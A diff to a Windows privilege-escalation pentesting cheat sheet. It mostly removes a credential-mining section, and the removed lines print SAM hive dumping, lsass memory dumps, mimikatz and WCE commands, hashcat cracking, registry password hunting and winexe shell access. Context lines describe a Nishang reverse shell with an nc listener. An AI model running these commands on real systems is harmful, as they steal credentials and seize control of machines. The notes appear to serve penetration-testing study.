@@ -4,14 +4,8 @@ Basics:
 	our goal is to get admin or system shell
 	SYSTEM account:(NT Authority/System)
 		It's an internal account that isn't shown inser control panel or anywhere else. It has same privileges as ADMINISTRATOR, But both of them have different functions.
-	SAM(security accounts manager):(c:\windows\system32\config\SAM)
-		Database having user accounts with hashed passwords
-			Hash_format:
-				username:useris:lan_manager_hash:NTLM_hash
-				NTLM(NT LAN Manager):MD4
-				LM Hash:DES Encryption
-	Windows Vault:(Credential Manager)	
-		stores credentials using which Windows log in the users automatically, which means that any Windows application that needs credentials to access a resource can make use of CWindows Vault and use the credentials supplied instead of users entering the username and password all the time.
+	SAM:Covered in Active Directory Sheet
+	Windows Vault:Covered in Active Directory Sheet	
 	PowerShell: See PowerShell For Pentesting
 	CommandPrompt: See CommandPrompt For Pentesting	
 	ACL:(Acess Control List)
@@ -24,6 +18,7 @@ Basics:
 		Registeries are of 2 types:
 			HKLM => LM means Local Machiene
 			HKCU => CU means Current User
+			HKU => U means User (when no user in logged in)
 		Registry has keys like HKLM\Software\policies\windows\installer
 		we can see Data inside keys:
 			cmd> req query HKLM\Software\policies\windows\installer
@@ -663,74 +658,7 @@ UAC Bypass:
 	Bypassing UAC via DLL Hijacking:
 		Here, we find a process/application that has "autoelevate" and then do DLL Hijacking for that process
 	What is "Run as Administrator"
-Credentials mining:(important part in privesc)
-	Dumping Sam file:
-		dumping windows hashes using registery hives:
-			C:\> mkdir temp
-			C:\> reg.exe save hklm\sam c:\temp\sam.save
-			C:\> reg.exe save hklm\security c:\temp\security.save
-			C:\> reg.exe save hklm\system c:\temp\system.save
-			tranfer these using smbserver
-			secretsdump.py -sam sam.save -security security.save -system system.save LOCAL => gives ntlm hashes
-				Full guide of secretsdump.py is in Active Directory sheet
-		mimikatz.exe: Shown below
-		meterpreter:
-			hashdump
-		samdump2 SYSTEM SAM
-	Cracking ntlm hashes:
-		https://samsclass.info/123/proj10/px16-hashcat-win.htm
-		hashcat -m 1000 -a 0 -o out.txt hashes.txt wordlist.txt
-	Memory Password mining:	
-		Procdump.exe:(sysinternals tool)
-			Its used to dump processes in memory, Services like FTP have credentials in clear text in memory.So, we can dump memory and read the credentials.
-			procdump.exe -accepteula -ma lsass.exe lsass.dmp
-			copy dump file to local windows machine of same arch
-		mimikatz.exe: Shown below
-	Grabbing Clear Text Passwords From Memory:
-		Note:
-			winpeas do it automatically 
-		WCE:(Windows Credential Editor)
-			It allows to list windows logon sessions and add/delete/change/list associated crentials(LM/NT hash,kerbros tickets, passwords)
-			wce -l => list logon sessions and hashes
-			wce -w => to dump clear text passwords
-			issue:
-				can easily invoke antivirus/windows_defender
-		mimikatz: Shown below
-		Note:
-			we need admin privileges to run both WCE and mimikatz
-	Password hunting from strings:
-		Note:
-			winpeas do it automatically 
-		Manual:
-			findstr /si password *.txt *.ini *.config
-			dir /s *pass* == *cred* == *vnc* == *.config*
-			Searching in Registry Keys:
-				Passwords:
-					reg query HKLM /f password /t REG_SZ /s
-					reg query HKCU /f password /t REG_SZ /s
-				SSH keys:	
-					SSH private keys can be stored inside the registry key "HKCU\Software\OpenSSH\Agent\Keys"
-					reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
-					once found, they can be decrypted using::
-						https://github.com/ropnop/windows_sshagent_extract
-	mimikatz:
-		C:\>mimikatz.exe
-				privilege::debug
-				token::elevate
-				lsadump::sam => dump SAM
-				sekurlsa::minidump c:\users\whoami\desktop\lsass.dmp => dump lsass
-				sekurlsa::logonPasswords full => Grabbing Clear Text Passwords From Memory
-		Note:
-			mimikatz is arch-dependent and has two versions available, x86 and x64.
-		Note:
-			we need privileges to run mimikatz
-	Once we get the creds:
-		If we have hash:
-			pass-the-hash => Read in "Active Directory"
-		If we have cleartext creds:
-			winexe:
-				winexe -U 'admin%pass' //ip cmd.exe => gives admin shell
-				winexe -U 'admin%pass' --system //ip cmd.exe => gives system shell
+Credentials mining:(important part in privesc) => Covered in Active Directory Sheet
 Nishang:
 	it is a collection of powershell scripts which helps in getting a powershell reverse shell
 	shells/Invoke-PoweshellTcp:
@@ -739,6 +667,8 @@ Nishang:
 		nc -nvlp 5566
 		and somehow transfer it to shell of victim using IEX in Powershell, it will execute on it own after downloading.
 Winrm Pentesting: see Active information gathering
+pass-the-hash
+pass-the-password
 file transfer:
 	Downloadind and Sending files from windows:
 		Using ftp:
